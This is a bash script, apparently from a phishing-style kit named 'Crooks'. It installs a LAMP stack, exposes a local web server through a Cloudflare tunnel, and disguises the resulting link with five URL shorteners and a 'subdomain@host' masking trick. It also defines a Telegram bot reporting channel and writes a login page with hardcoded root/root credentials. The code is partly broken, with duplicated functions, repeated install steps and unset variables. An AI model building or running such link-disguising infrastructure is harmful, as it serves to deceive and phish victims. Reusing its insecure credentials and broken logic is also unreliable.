#!/bin/bash

sudo chmod 440 /etc/sudo.conf
sudo chmod 440 /etc/sudoers
sudo chmod 750 /etc/sudoers.d

DB_NAME="Crooks-sql-php-cloudflared-tunnel"
DB_USER="root"
DB_PASSWORD="root"
TELEGRAM_BOT_TOKEN="YOUR_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID="-953492204"
CLOUDFLARED_LOG_FILE="./.log/cloudflared.log"
host="127.0.0.1"
port="8088"

display_message() {
    echo "==============================================="
    echo "$1RANDOM RYANS BACK MOTHER FUCKERS!!!!!!!!!!!"
    echo "==============================================="
}

prompt_yes_no() {
    while true; do
        read -p "$1 (yes/no): " yn
        case $yn in
            [Yy]* ) return 0;;
            [Nn]* ) return 1;;
            * ) echo "Please answer yes or no.";;
        esac
    done
}

if prompt_yes_no "Do you want to skip MySQL Server installation?"; then
    SKIP_MYSQL_INSTALL=true
else
    SKIP_MYSQL_INSTALL=false
fi

if ! $SKIP_MYSQL_INSTALL; then
    display_message "Updating system..."
    sudo apt update
    sudo apt upgrade -y

    display_message "Securing MySQL installation..."
    sudo mysql_secure_installation
else
    display_message "Skipping MySQL Server installation..."
fi

send_telegram_message() {
    message="$1"
    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
        -d "chat_id=$TELEGRAM_CHAT_ID" \
        -d "text=$message"
}

shorten_url_shrtcode() {
    url="$1"
    response=$(curl -s -X POST "https://api.shrtco.de/v2/shorten?url=$url")
    shortened_url=$(echo "$response" | jq -r '.result.full_short_link2')
    echo "$shortened_url"
}

get_cloudflared() {
    url="$1"
    file=$(basename "$url")
    
    if [[ -e "$file" ]]; then
        rm -rf "$file"
    fi

    wget --no-check-certificate "$url" > /dev/null 2>&1

    if [[ -e "$file" ]]; then
        mv -f "$file" ./.host/cloudflared > /dev/null 2>&1
        chmod +x ./.host/cloudflared > /dev/null 2>&1
    else
        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error: Install Cloudflared manually."
        exit 1
    fi
}

shorten_url_shrtcode() {
    url="$1"
    response=$(curl -s -X POST "https://api.shrtco.de/v2/shorten?url=$url")
    shortened_url=$(echo "$response" | jq -r '.result.full_short_link2')
    echo "$shortened_url"
}

shorten_url_isgd() {
    url="$1"
    shortened_url=$(curl -s "https://is.gd/create.php?format=simple&url=$url")
    echo "$shortened_url"
}

shorten_url_tinyurl() {
    url="$1"
    shortened_url=$(curl -s "https://tinyurl.com/api-create.php?url=$url")
    echo "$shortened_url"
}

shorten_url_t2mio() {
    url="$1"
    shortened_url=$(curl -s "https://t2m.io/api?format=text&url=$url")
    echo "$shortened_url"
}

shorten_url_cutly() {
    url="$1"
    data="{\"url\":\"$url\"}"
    shortened_url=$(curl -s -X POST "https://cutt.ly/api/api.php" -d "$data" | jq -r '.url.shortLink')
    echo "$shortened_url"
}

cloudflared_start() {
    echo -e "\n[+] Initializing... (http://$host:$port)"
    echo -ne "\n\n[+] Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > "$CLOUDFLARED_LOG_FILE" 2>&1 &
    else
        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > "$CLOUDFLARED_LOG_FILE" 2>&1 &
    fi

    { sleep 12; clear; }

    cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$CLOUDFLARED_LOG_FILE")
    cldflr_url1=${cldflr_url#https://}

    url_short1=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")
    url_short2=$(curl -s 'https://tinyurl.com/api-create.php?url='"$cldflr_url1")
    url_short3=$(curl -s 'https://clck.ru/--?url='"$cldflr_url1")
    url_short4=$(curl -s 'https://shorte.st/api/url/shorten?&url='"$cldflr_url1")
    url_short5=$(curl -s 'https://da.gd/s?url='"$cldflr_url1")

    echo -e "\n[+] URL http : http://$cldflr_url1"
    echo -e "\n[+] URL http(s) : $cldflr_url"
    echo -e "\n[+] URL subdomain : $subdomain@$cldflr_url1"
    echo -e "\n[+] URL shortener 1 : $url_short1"
    echo -e "\n[+] URL shortener 2 : $url_short2"
    echo -e "\n[+] URL shortener 3 : $url_short3"
    echo -e "\n[+] URL shortener 4 : $url_short4"
    echo -e "\n[+] URL shortener 5 : $url_short5"
}

cloudflared_download_and_install() {
    if [[ -e ".host/cloudflared" ]]; then
        echo -e "\n[+] Cloudflared already installed."
        sleep 1
    else
        echo -e "\n[+] Creating .host folder..."
        mkdir -p ./.host

        echo -e "\n[+] Downloading and Installing Cloudflared..."
        architecture=$(uname -m)
        if [[ ("$architecture" == *'arm'*) || ("$architecture" == *'Android'*) ]]; then
            get_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
        elif [[ "$architecture" == *'aarch64'* ]]; then
            get_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
        elif [[ "$architecture" == *'x86_64'* ]]; then
            get_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
        else
            get_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
        fi

        echo -e "\n[+] Moving Cloudflared binary to .host folder..."
        mv "$file" ./.host/cloudflared > /dev/null 2>&1
        chmod +x ./.host/cloudflared > /dev/null 2>&1
    fi
}

check_root_and_os() {
    OS_SYSTEM=$(uname -o)

    if [ $OS_SYSTEM != Android ]; then
        if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
            { clear; }
            echo -e "The program cannot run.\nFor running the program on a GNU/Linux Operating System,\nGive root privileges and try again. \n"
            exit 1
        fi
    fi
}

check_os_and_install_packages() {
    if [[ -f .host/ngrok && -f .host/cloudflared ]]; then
        { clear; }
    else
        { clear; }
        OS_SYSTEM=$(uname -o)	
        if [ $OS_SYSTEM != Android ]; then
            bash packages.sh
            bash tunnels.sh
        else	
            ./packages.sh
            ./tunnels.sh
        fi	
    fi
}

display_message "Updating system..."
sudo apt update
sudo apt upgrade -y

display_message "Installing MySQL Server..."
sudo apt install -y mysql-server

display_message "Securing MySQL installation..."
sudo mysql_secure_installation

display_message "Installing Apache2..."
sudo apt install -y apache2

display_message "Installing PHP 8.2 and required modules..."
sudo add-apt-repository ppa:ondrej/php -y
sudo apt update
sudo apt install -y php8.2 php8.2-cli php8.2-common libapache2-mod-php8.2 php8.2-mysql php8.2-curl php8.2-gd php8.2-json php8.2-mbstring php8.2-intl php8.2-xml php8.2-zip

display_message "Enabling PHP module in Apache2..."
sudo a2enmod php8.2

display_message "Restarting Apache2..."
sudo systemctl restart apache2

display_message "Downloading and installing Cloudflared..."
cloudflared_download_and_install

display_message "Creating web root folder and subdirectories..."
mkdir -p ./.www/admin/panel
mkdir ./.www/admin/page

display_message "Setting permissions for web root folder..."
sudo chown -R www-data:www-data ./.www

display_message "Creating MySQL database and user..."
sudo mysql -u root -p <<MYSQL_SCRIPT
CREATE DATABASE IF NOT EXISTS $DB_NAME;
CREATE USER IF NOT EXISTS '$DB_USER'@'localhost' IDENTIFIED BY '$DB_PASSWORD';
GRANT ALL PRIVILEGES ON $DB_NAME.* TO '$DB_USER'@'localhost';
FLUSH PRIVILEGES;
MYSQL_SCRIPT

cat <<EOL > ./.www/admin/panel/login.php
<?php
\$username = 'root';
\$password = 'root';
if (\$_POST['username'] == \$username && \$_POST['password'] == \$password) {
    echo 'Login successful!';
} else {
    echo 'Login failed.';
}
?>
EOL

display_message "Updating system..."
sudo apt update
sudo apt upgrade -y

display_message "Installing MySQL Server..."
sudo apt install -y mysql-server

display_message "Securing MySQL installation..."
sudo mysql_secure_installation

display_message "Installing Apache2..."
sudo apt install -y apache2

display_message "Installing PHP and required modules..."
sudo apt install -y php8.2 php8.2-cli php8.2-common libapache2-mod-php8.2 php8.2-mysql php8.2-curl php8.2-gd php8.2-json php8.2-mbstring php8.2-intl php8.2-xml php8.2-zip

display_message "Enabling PHP module in Apache2..."
sudo a2enmod php8.2

display_message "Restarting Apache2..."
sudo systemctl restart apache2

display_message "Downloading and installing Cloudflared..."
get_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'

cloudflared_start
